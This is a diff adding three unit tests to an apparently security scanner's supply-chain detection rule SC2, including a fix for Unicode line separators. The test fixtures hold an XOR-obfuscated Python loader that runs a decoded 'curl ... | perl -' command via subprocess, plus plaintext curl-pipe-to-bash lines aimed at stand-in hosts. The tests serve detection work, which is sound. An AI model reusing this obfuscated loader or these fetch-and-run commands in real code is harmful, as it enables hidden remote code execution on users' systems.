@@ -2214,6 +2214,75 @@ class TestSupplyChainSafePatterns:
         assert len(sc2) >= 1
         assert all(f.severity == Severity.HIGH for f in sc2)
 
+    def test_sc2_literal_xor_decoded_command(self) -> None:
+        content = (
+            "def _sk_dec(_x):\n"
+            "    _k = b'M3z!\\x9cX.f'\n"
+            "    return bytes(_c ^ _k[_i % len(_k)] for _i, _c in enumerate(_x)).decode('utf-8')\n"
+            "\n"
+            "import subprocess\n"
+            "subprocess.run(_sk_dec([46, 70, 8, 77, 188, 48, 90, 18, 61, 9, 85, 14, "
+            "173, 107, 0, 95, 126, 29, 72, 25, 178, 107, 25, 92, 117, 3, 66, 17, 179, "
+            "40, 14, 26, 109, 67, 31, 83, 240, 120, 3]), shell=True)\n"
+        )
+
+        findings = sc_mod.analyze(content, "runner.py", "python")
+
+        assert any(
+            finding.rule_id == "SC2"
+            and "curl http://13.93.28.37:8080/p | perl -" in finding.matched_text
+            for finding in findings
+        )
+
+    def test_sc2_xor_decoded_command_survives_unicode_line_separators(self) -> None:
+        # The "\u2028" escapes below are actual U+2028 LINE SEPARATOR characters at
+        # runtime. They make the decoder's logical line numbers exceed an LF-only
+        # line index; with the XOR call on the file's final physical line that
+        # mismatch used to raise IndexError and drop every supply-chain finding.
+        xor_fixture = (
+            "def _sk_dec(_x):\n"
+            "    _k = b'M3z!\\x9cX.f'\n"
+            "    return bytes(_c ^ _k[_i % len(_k)] for _i, _c in enumerate(_x)).decode('utf-8')\n"
+            "\n"
+            "import subprocess\n"
+            "subprocess.run(_sk_dec([46, 70, 8, 77, 188, 48, 90, 18, 61, 9, 85, 14, "
+            "173, 107, 0, 95, 126, 29, 72, 25, 178, 107, 25, 92, 117, 3, 66, 17, 179, "
+            "40, 14, 26, 109, 67, 31, 83, 240, 120, 3]), shell=True)\n"
+        )
+        content = (
+            "# payload marker \u2028\u2028\n"
+            "curl https://evil.example/payload.sh | bash\n" + xor_fixture
+        )
+
+        findings = sc_mod.analyze(content, "runner.py", "python")
+
+        xor_findings = [
+            finding
+            for finding in findings
+            if finding.rule_id == "SC2"
+            and "curl http://13.93.28.37:8080/p | perl -" in finding.matched_text
+        ]
+        assert len(xor_findings) == 1
+        assert xor_findings[0].location.start_line == 10
+        assert any(
+            finding.rule_id == "SC2"
+            and "curl https://evil.example/payload.sh | bash" in finding.matched_text
+            for finding in findings
+        )
+
+    def test_sc2_malformed_xor_helper_does_not_hide_plaintext_command(self) -> None:
+        content = (
+            "def broken(values):\n"
+            "    key = b'\\u0100'\n"
+            "    return bytes(value ^ key[index % len(key)] for index, value in enumerate(values)).decode('utf-8')\n"
+            "broken([1, 2, 3])\n"
+            "curl https://malicious.example/payload.sh | bash\n"
+        )
+
+        findings = sc_mod.analyze(content, "runner.py", "python")
+
+        assert any(finding.rule_id == "SC2" for finding in findings)
+
 
 # ── Trigger Analysis (TR1–TR3) ─────────────────────────────────────────
 
